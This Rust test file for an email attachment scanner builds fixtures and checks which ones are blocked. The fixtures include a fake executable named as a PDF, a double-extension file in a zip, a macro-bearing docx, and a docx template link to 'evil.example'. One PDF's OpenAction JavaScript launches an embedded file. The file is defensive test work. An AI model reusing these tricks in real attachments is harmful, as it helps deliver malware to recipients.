//! End-to-end inspection tests over hand-built fixtures.

use mailxray_core::{Policy, Verdict, inspect};

// ---------------------------------------------------------------- fixtures

fn zip_with(entries: &[(&str, &[u8])]) -> Vec<u8> {
    use std::io::Write;
    let mut buf = Vec::new();
    {
        let mut z = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
        let opts: zip::write::FileOptions<()> =
            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
        for (name, data) in entries {
            z.start_file(*name, opts).unwrap();
            z.write_all(data).unwrap();
        }
        z.finish().unwrap();
    }
    buf
}

/// A minimal but valid PDF with an /OpenAction running JavaScript.
fn pdf_with_js() -> Vec<u8> {
    let mut doc = lopdf::Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let content = doc.add_object(lopdf::Stream::new(
        lopdf::Dictionary::new(),
        b"BT /F1 12 Tf 72 720 Td (x) Tj ET".to_vec(),
    ));
    let page = doc.add_object(lopdf::Dictionary::from_iter(vec![
        ("Type", lopdf::Object::Name(b"Page".to_vec())),
        ("Parent", lopdf::Object::Reference(pages_id)),
        ("MediaBox", vec![0.into(), 0.into(), 595.into(), 842.into()].into()),
        ("Contents", lopdf::Object::Reference(content)),
    ]));
    doc.objects.insert(
        pages_id,
        lopdf::Object::Dictionary(lopdf::Dictionary::from_iter(vec![
            ("Type", lopdf::Object::Name(b"Pages".to_vec())),
            ("Kids", vec![lopdf::Object::Reference(page)].into()),
            ("Count", 1.into()),
        ])),
    );
    let mut action = lopdf::Dictionary::new();
    action.set("S", lopdf::Object::Name(b"JavaScript".to_vec()));
    action.set(
        "JS",
        lopdf::Object::string_literal("this.exportDataObject({cName:'x', nLaunch:2})"),
    );
    let catalog = doc.add_object(lopdf::Dictionary::from_iter(vec![
        ("Type", lopdf::Object::Name(b"Catalog".to_vec())),
        ("Pages", lopdf::Object::Reference(pages_id)),
        ("OpenAction", lopdf::Object::Dictionary(action)),
    ]));
    doc.trailer.set("Root", catalog);
    let mut out = Vec::new();
    doc.save_to(&mut out).unwrap();
    out
}

fn pdf_plain() -> Vec<u8> {
    let mut doc = lopdf::Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let content = doc.add_object(lopdf::Stream::new(
        lopdf::Dictionary::new(),
        b"BT /F1 12 Tf 72 720 Td (x) Tj ET".to_vec(),
    ));
    let page = doc.add_object(lopdf::Dictionary::from_iter(vec![
        ("Type", lopdf::Object::Name(b"Page".to_vec())),
        ("Parent", lopdf::Object::Reference(pages_id)),
        ("MediaBox", vec![0.into(), 0.into(), 595.into(), 842.into()].into()),
        ("Contents", lopdf::Object::Reference(content)),
    ]));
    doc.objects.insert(
        pages_id,
        lopdf::Object::Dictionary(lopdf::Dictionary::from_iter(vec![
            ("Type", lopdf::Object::Name(b"Pages".to_vec())),
            ("Kids", vec![lopdf::Object::Reference(page)].into()),
            ("Count", 1.into()),
        ])),
    );
    let catalog = doc.add_object(lopdf::Dictionary::from_iter(vec![
        ("Type", lopdf::Object::Name(b"Catalog".to_vec())),
        ("Pages", lopdf::Object::Reference(pages_id)),
    ]));
    doc.trailer.set("Root", catalog);
    let mut out = Vec::new();
    doc.save_to(&mut out).unwrap();
    out
}

const MZ: &[u8] = b"MZ\x90\x00\x03\x00\x00\x00rest-of-a-fake-pe";
const TEXT: &[u8] = b"just a normal note\n";

// ---------------------------------------------------------------- tests

#[test]
fn clean_text_attachment() {
    let p = Policy::default();
    let r = inspect(Some("notes.txt"), TEXT, &p);
    assert_eq!(r.verdict, Verdict::Clean, "reasons: {:?}", r.reasons);
    assert_eq!(r.real_type, "text");
    assert!(!r.type_mismatch);
    assert_eq!(r.hash.len(), 64);
}

#[test]
fn exe_is_blocked_even_when_named_pdf() {
    let p = Policy::default();
    let r = inspect(Some("invoice.pdf"), MZ, &p);
    assert_eq!(r.verdict, Verdict::Blocked);
    assert!(r.type_mismatch);
    let codes: Vec<_> = r.reasons.iter().map(|x| x.code.as_str()).collect();
    assert!(codes.contains(&"blocked-type"), "codes: {codes:?}");
    assert!(codes.contains(&"type-mismatch"));
}

#[test]
fn clean_zip_passes() {
    let p = Policy::default();
    let zip = zip_with(&[("readme.txt", TEXT), ("photo.png", b"\x89PNG\r\n\x1a\nxx")]);
    let r = inspect(Some("files.zip"), &zip, &p);
    assert_eq!(r.verdict, Verdict::Clean, "reasons: {:?}", r.reasons);
    match &r.details {
        mailxray_core::Details::Archive(a) => {
            assert_eq!(a.entries.len(), 2);
            assert!(a.listed);
            assert!(!a.truncated);
        }
        other => panic!("expected archive details, got {other:?}"),
    }
}

#[test]
fn exe_inside_zip_is_blocked() {
    let p = Policy::default();
    let zip = zip_with(&[("invoice.pdf.exe", MZ), ("readme.txt", TEXT)]);
    let r = inspect(Some("attachment.zip"), &zip, &p);
    assert_eq!(r.verdict, Verdict::Blocked);
    assert!(r.reasons.iter().any(|x| x.code == "executable-inside"));
}

#[test]
fn nested_zip_is_listed_and_judged() {
    let p = Policy::default();
    let inner = zip_with(&[("payload.exe", MZ)]);
    let outer = zip_with(&[("inner.zip", &inner), ("readme.txt", TEXT)]);
    let r = inspect(Some("outer.zip"), &outer, &p);
    assert_eq!(r.verdict, Verdict::Blocked);
    match &r.details {
        mailxray_core::Details::Archive(a) => {
            assert!(a.entries.iter().any(|e| e.name == "payload.exe"));
            assert_eq!(a.depth, 1);
        }
        other => panic!("expected archive details, got {other:?}"),
    }
}

#[test]
fn docx_with_macro_is_blocked() {
    let p = Policy::default();
    let docx = zip_with(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
        ("word/vbaProject.bin", b"\xCD\xCD\xCD"),
    ]);
    let r = inspect(Some("invoice.docx"), &docx, &p);
    assert_eq!(r.verdict, Verdict::Blocked);
    assert!(r.reasons.iter().any(|x| x.code == "macro-present"));
    match &r.details {
        mailxray_core::Details::Ooxml(d) => {
            assert_eq!(d.format, "docx");
            assert!(d.macros);
        }
        other => panic!("expected ooxml details, got {other:?}"),
    }
}

#[test]
fn docx_without_macro_is_clean_but_flagged_for_external_links() {
    let p = Policy::default();
    let clean = zip_with(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
    ]);
    let r = inspect(Some("clean.docx"), &clean, &p);
    assert_eq!(r.verdict, Verdict::Clean, "reasons: {:?}", r.reasons);

    let linked = zip_with(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
        (
            "word/_rels/document.xml.rels",
            br#"<Relationships><Relationship Id="r1" Type=".../attachedTemplate"
                 Target="http://evil.example/x.dotm" TargetMode="External"/></Relationships>"#,
        ),
    ]);
    let r = inspect(Some("linked.docx"), &linked, &p);
    assert_eq!(r.verdict, Verdict::Suspicious);
    assert!(r.reasons.iter().any(|x| x.code == "external-references"));
}

#[test]
fn pdf_with_javascript_is_blocked() {
    let p = Policy::default();
    let r = inspect(Some("statement.pdf"), &pdf_with_js(), &p);
    assert_eq!(r.verdict, Verdict::Blocked, "reasons: {:?}", r.reasons);
    match &r.details {
        mailxray_core::Details::Pdf(d) => {
            assert!(d.open_action);
            assert!(!d.javascript.is_empty());
            assert!(d.javascript[0].contains("exportDataObject"));
        }
        other => panic!("expected pdf details, got {other:?}"),
    }
}

#[test]
fn plain_pdf_is_clean() {
    let p = Policy::default();
    let r = inspect(Some("statement.pdf"), &pdf_plain(), &p);
    assert_eq!(r.verdict, Verdict::Clean, "reasons: {:?}", r.reasons);
    match &r.details {
        mailxray_core::Details::Pdf(d) => {
            assert_eq!(d.pages, 1);
            assert!(d.javascript.is_empty());
            assert!(!d.launch);
        }
        other => panic!("expected pdf details, got {other:?}"),
    }
}

#[test]
fn rar_is_recognised_but_not_listed() {
    let p = Policy::default();
    let rar = b"Rar!\x1a\x07\x01\x00and-then-some-header-bytes";
    let r = inspect(Some("archive.rar"), rar, &p);
    // Not blocked by itself, but the report says we could not look inside.
    assert!(r.reasons.iter().any(|x| x.code == "container-not-listed"));
    match &r.details {
        mailxray_core::Details::Archive(a) => {
            assert_eq!(a.format, "rar5");
            assert!(!a.listed);
        }
        other => panic!("expected archive details, got {other:?}"),
    }
}

#[test]
fn gzip_is_opened_and_judged() {
    use std::io::Write;
    let p = Policy::default();
    let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    enc.write_all(TEXT).unwrap();
    let gz = enc.finish().unwrap();
    let r = inspect(Some("note.txt.gz"), &gz, &p);
    assert_eq!(r.verdict, Verdict::Clean, "reasons: {:?}", r.reasons);
}

#[test]
fn json_round_trip_has_one_kind_key() {
    let p = Policy::default();
    let docx = zip_with(&[
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
    ]);
    let r = inspect(Some("a.docx"), &docx, &p);
    let json = serde_json::to_string(&r).unwrap();
    assert_eq!(json.matches("\"kind\"").count(), 1, "duplicate discriminator: {json}");
    assert!(json.contains("\"format\":\"docx\""), "{json}");
}
